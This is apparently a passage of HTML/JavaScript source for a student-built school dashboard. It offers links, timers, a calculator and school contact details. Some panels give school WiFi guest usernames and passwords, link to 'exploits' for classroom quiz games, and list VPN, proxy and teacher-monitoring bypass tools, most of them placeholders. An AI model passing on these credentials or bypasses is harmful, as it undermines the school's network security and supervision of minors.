      <button onclick="dashboard.togglePanel('factsPanel')">💡 Random Facts</button>
      <button onclick="dashboard.togglePanel('quotesPanel')">💬 Daily Quotes</button>
      <button onclick="dashboard.togglePanel('calculatorPanel')">🧮 Calculator</button>
      <button onclick="dashboard.togglePanel('unitConverterPanel')">🔄 Unit Converter</button>
      <button onclick="dashboard.togglePanel('statsPanel')">📊 Stats</button>
      <button onclick="dashboard.togglePanel('mediaPanel')">📺 Media Hub</button>
      <button onclick="dashboard.togglePanel('reminderPanel')">⏰ Reminders</button>
      <button onclick="dashboard.togglePanel('keybindsPanel')">⌨️ Keybinds</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px; width: 100%; max-width: 1200px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="wifi-level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="wifi-level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="wifi-level-medium">Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="wifi-level-low">Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <h2>⚙️ Settings</h2>
        <div class="settings-grid">
          <div class="setting-toggle">
            <span>Enable Notifications</span>
            <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
          </div>
          <div class="setting-toggle">
            <span>Dark Mode Sync</span>
            <label class="switch"><input type="checkbox"><span class="slider"></span></label>
          </div>
          <button>Change Password</button>
          <button>Update Profile</button>
          <button>Privacy Settings</button>
          <button>Security Log</button>
          <div class="setting-toggle">
            <span>Auto Logout</span>
            <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
          </div>
          <button>Export Data</button>
          <button>Manage Sessions</button>
          <div class="setting-toggle">
            <span>Two-Factor Auth</span>
            <label class="switch"><input type="checkbox"><span class="slider"></span></label>
          </div>
          <button>Feedback & Support</button>
          <button>About System</button>
          <button>Check for Updates</button>
          <div class="setting-toggle">
            <span>High Contrast Mode</span>
            <label class="switch"><input type="checkbox"><span class="slider"></span></label>
          </div>
          <div class="setting-toggle">
            <span>Accessibility Features</span>
            <label class="switch"><input type="checkbox"><span class="slider"></span></label>
          </div>
          <button>Configure Alerts</button>
          <button>Backup Data</button>
          <button>Reset Settings</button>
        </div>
      </div>

      <!-- Keybinds Panel -->
      <div id="keybindsPanel" class="info-panel">
        <h2>⌨️ Keybinds Configuration</h2>
        <p>This panel allows you to configure custom keybinds for various actions. Currently, no keybinds are configured by default, but you can set them here.</p>
        <div class="info-text">
          <h3>Examples:</h3>
          <ul>
            <li>`Ctrl + S`: Save Notes</li>
            <li>`Alt + P`: Panic Button</li>
            <li>`Ctrl + Shift + T`: Toggle Sections</li>
          </ul>
          <p><strong>Note:</strong> Implementing fully configurable keybinds requires significant JavaScript event handling and state management for each action. This is a placeholder for future implementation.</p>
        </div>
      </div>

      <!-- Timer/Stopwatch/Countdown Panel -->
      <div id="timerStopwatchPanel" class="info-panel">
        <h2>⏱️ Timer & Stopwatch</h2>
        <div class="timer-display" id="timerDisplay">00:00:00</div>
        <div class="timer-controls">
          <button id="startStopwatchBtn">Start Stopwatch</button>
          <button id="stopStopwatchBtn">Stop Stopwatch</button>
          <button id="resetStopwatchBtn">Reset Stopwatch</button>
        </div>
        
        <h3 style="margin-top: 25px;">Countdown Timer</h3>
        <div class="timer-input">
          <input type="number" id="countdownHours" value="0" min="0" max="23"> H
          <input type="number" id="countdownMinutes" value="0" min="0" max="59"> M
          <input type="number" id="countdownSeconds" value="0" min="0" max="59"> S
        </div>
        <div class="timer-controls">
          <button id="startCountdownBtn">Start Countdown</button>
          <button id="pauseCountdownBtn">Pause Countdown</button>
          <button id="resetCountdownBtn">Reset Countdown</button>
        </div>
        <p style="margin-top: 15px;"><strong>Note:</strong> Alerts for timers will appear using the system's `alert()` function (without sound).</p>
      </div>

      <!-- Activity Logs Panel -->
      <div id="activityLogPanel" class="info-panel">
        <h2>📜 Activity Logs</h2>
        <p>This shows a log of actions performed within this session.</p>
        <div id="activityLogsContent" style="max-height: 300px; overflow-y: auto; border: 1px solid #333; padding: 10px; border-radius: 8px;">
          <!-- Activity logs will be inserted here by JS -->
        </div>
        <button style="margin-top: 15px;" onclick="dashboard.clearActivityLogs()">Clear Activity Logs</button>
      </div>

      <!-- Login History Panel -->
      <div id="loginHistoryPanel" class="info-panel">
        <h2>📝 Login History</h2>
        <p>Your last login details:</p>
        <div id="lastLoginInfo" class="info-text">
          <p><strong>Last Login:</strong> <span id="lastLoginTimestamp">N/A</span></p>
          <p><strong>User:</strong> <span id="lastLoginUser">N/A</span></p>
          <p><strong>ID:</strong> <span id="lastLoginID">N/A</span></p>
        </div>
        <p style="margin-top: 15px;"><strong>Note:</strong> This stores the last successful login client-side. A comprehensive history would require a backend.</p>
      </div>

      <!-- Random Facts Panel -->
      <div id="factsPanel" class="info-panel">
        <h2>💡 Random Fact</h2>
        <p id="randomFactText"></p>
        <button style="margin-top: 15px;" onclick="dashboard.displayRandomFact()">New Fact</button>
      </div>

      <!-- Daily Quotes Panel -->
      <div id="quotesPanel" class="info-panel">
        <h2>💬 Daily Quote</h2>
        <p id="dailyQuoteText"></p>
        <button style="margin-top: 15px;" onclick="dashboard.displayDailyQuote()">New Quote</button>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>🧮 Calculator</h2>
        <div id="calculatorDisplay">0</div>
        <div class="calculator-grid">
          <button onclick="dashboard.appendToCalcDisplay('7')">7</button>
          <button onclick="dashboard.appendToCalcDisplay('8')">8</button>
          <button onclick="dashboard.appendToCalcDisplay('9')">9</button>
          <button class="operator" onclick="dashboard.appendToCalcDisplay('/')">/</button>
          <button onclick="dashboard.appendToCalcDisplay('4')">4</button>
          <button onclick="dashboard.appendToCalcDisplay('5')">5</button>
          <button onclick="dashboard.appendToCalcDisplay('6')">6</button>
          <button class="operator" onclick="dashboard.appendToCalcDisplay('*')">*</button>
          <button onclick="dashboard.appendToCalcDisplay('1')">1</button>
          <button onclick="dashboard.appendToCalcDisplay('2')">2</button>
          <button onclick="dashboard.appendToCalcDisplay('3')">3</button>
          <button class="operator" onclick="dashboard.appendToCalcDisplay('-')">-</button>
          <button onclick="dashboard.appendToCalcDisplay('0')">0</button>
          <button onclick="dashboard.appendToCalcDisplay('.')">.</button>
          <button class="operator" onclick="dashboard.clearCalcDisplay()">C</button>
          <button class="operator" onclick="dashboard.calculateResult()">=</button>
          <button class="operator" onclick="dashboard.appendToCalcDisplay('+')">+</button>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel">
        <h2>🔄 Unit Converter</h2>
        <div class="unit-converter-input">
          <input type="number" id="convertValue" value="1">
          <select id="convertFromUnit">
            <option value="cm">Centimeters</option>
            <option value="m">Meters</option>
            <option value="km">Kilometers</option>
            <option value="in">Inches</option>
            <option value="ft">Feet</option>
          </select>
          <span>to</span>
          <select id="convertToUnit">
            <option value="m">Meters</option>
            <option value="cm">Centimeters</option>
            <option value="km">Kilometers</option>
            <option value="ft">Feet</option>
            <option value="in">Inches</option>
          </select>
        </div>
        <button onclick="dashboard.convertUnit()">Convert</button>
        <div id="unitResult">Result: 0</div>
      </div>

      <!-- Stats Panel -->
      <div id="statsPanel" class="info-panel">
        <h2>📊 User Statistics</h2>
        <p>Activity within this session:</p>
        <div class="info-text">
          <p><strong>Buttons Pressed:</strong> <span id="statsButtonsPressed">0</span></p>
          <p><strong>Toggles Used:</strong> <span id="statsTogglesUsed">0</span></p>
          <p><strong>Panels Opened:</strong> <span id="statsPanelsOpened">0</span></p>
          <p><strong>Notes Canvas Cleared:</strong> <span id="statsCanvasCleared">0</span></p>
          <p><strong>Logins Attempted:</strong> <span id="statsLoginsAttempted">0</span></p>
          <p><strong>Successful Logins:</strong> <span id="statsSuccessfulLogins">0</span></p>
        </div>
        <button style="margin-top: 15px;" onclick="dashboard.resetStats()">Reset Session Stats</button>
      </div>

      <!-- Media Hub Panel -->
      <div id="mediaPanel" class="info-panel">
        <h2>📺 Media Hub (Proxy)</h2>
        <p>This section is intended for embedding media content through a proxy to bypass network restrictions.</p>
        <div class="info-text">
          <p><strong>Note:</strong> Implementing a functional proxy for YouTube or other media requires a backend server to route the traffic. This functionality cannot be achieved with client-side HTML/JavaScript alone.</p>
          <p>As a placeholder, you can manually enter a YouTube embed link:</p>
          <input type="text" id="youtubeEmbedInput" placeholder="Enter YouTube embed URL (e.g., https://www.youtube.com/embed/VIDEO_ID)" style="width: 100%; margin-bottom: 10px; padding: 8px; background: #333; border: 1px solid #555; color: white; border-radius: 8px;">
          <button onclick="dashboard.loadYoutubeEmbed()">Load Video</button>
          <div id="youtubeEmbedContainer" style="margin-top: 20px; text-align: center;">
            <!-- YouTube embed will load here -->
          </div>
        </div>
      </div>

      <!-- Reminders Panel -->
      <div id="reminderPanel" class="info-panel">
        <h2>⏰ Reminders</h2>
        <div class="info-text">
          <p>Set a reminder (e.g., "Take a break" in 5 minutes).</p>
          <input type="text" id="reminderText" placeholder="What to remind you about?" style="width: 100%; margin-bottom: 10px; padding: 8px; background: #333; border: 1px solid #555; color: white; border-radius: 8px;">
          <input type="number" id="reminderMinutes" value="1" min="1" style="width: 80px; padding: 8px; background: #333; border: 1px solid #555; color: white; border-radius: 8px;"> minutes
          <button onclick="dashboard.setReminder()" style="margin-left: 10px;">Set Reminder</button>
          <div id="activeReminders" style="margin-top: 15px;">
            <h3>Active Reminders:</h3>
            <ul id="reminderList">
              <!-- Reminders will be listed here -->
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="500"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
        <label for="penColor">Pen Color:</label>
        <input type="color" id="penColor" value="#ff914d">
        <label for="penThickness">Thickness:</label>
        <input type="range" id="penThickness" min="1" max="10" value="2">
        <button id="toggleTextModeBtn">Aa Text Mode</button>
      </div>
    </div>
  </div>

  <script>
    // Global activity logger
    const activityLogger = {
      logs: [],
      addLog: function(action) {
        const timestamp = new Date().toLocaleString();
        const logEntry = `${timestamp}: ${action}`;
        this.logs.push(logEntry);
        dashboard.updateActivityLogsDisplay(); // Update display if dashboard is active
      },
      getLogs: function() {
        return this.logs;
      },
      clearLogs: function() {
        this.logs = [];
        dashboard.updateActivityLogsDisplay();
      }
    };

    // Global stats tracker
    const statsTracker = {
      buttonsPressed: 0,
      togglesUsed: 0,
      panelsOpened: 0,
      canvasCleared: 0,
      loginsAttempted: 0,
      successfulLogins: 0,
      increment: function(type) {
        this[type]++;
        dashboard.updateStatsDisplay();
      },
      resetSession: function() {
        this.buttonsPressed = 0;
        this.togglesUsed = 0;
        this.panelsOpened = 0;
        this.canvasCleared = 0;
        // Keep login attempts/successes across session for now
        dashboard.updateStatsDisplay();
      }
    };

    // Dashboard functionality object
    const dashboard = {
      is24HourFormat: false,
      currentTheme: 'dark-theme',
      stopwatchInterval: null,
      stopwatchSeconds: 0,
      countdownInterval: null,
      countdownRemaining: 0,
      countdownTargetTime: null,
      isCountdownPaused: false,
      reminders: [],
      
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initCalculator();
        this.initUnitConverter();
        this.initTimerStopwatch();
        this.displayRandomFact();
        this.displayDailyQuote();
        this.loadLoginHistory();
        this.loadReminders();
        this.updateStatsDisplay();
        this.applyTheme(this.currentTheme); // Apply theme on dashboard load
      },
      
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      initClock: function() {
        const loginCurrentTimeSpan = document.getElementById('loginCurrentTime');
        const loginCurrentDateSpan = document.getElementById('loginCurrentDate');
        const realTimeClockBtn = document.getElementById('realTimeClock');
        const realDateBtn = document.getElementById('realDate');

        function updateClockDisplay() {
          const now = new Date();
          const options = {
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric',
            hour12: !dashboard.is24HourFormat
          };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          if (loginCurrentTimeSpan) loginCurrentTimeSpan.innerText = timeStr;
          if (loginCurrentDateSpan) loginCurrentDateSpan.innerText = dateStr;
          if (realTimeClockBtn) realTimeClockBtn.innerText = '🕒 ' + timeStr;
          if (realDateBtn) realDateBtn.innerText = '📅 ' + dateStr;
        }
        
        // Initial call and interval for login page clock
        updateClockDisplay();
        setInterval(updateClockDisplay, 1000);

        // Toggle for 24-hour format
        document.getElementById('timeFormatToggle').addEventListener('change', (e) => {
          dashboard.is24HourFormat = e.target.checked;
          activityLogger.addLog(`Time format toggled to ${dashboard.is24HourFormat ? '24-hour' : '12-hour'}`);
          statsTracker.increment('togglesUsed');
          updateClockDisplay();
        });
      },
      
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
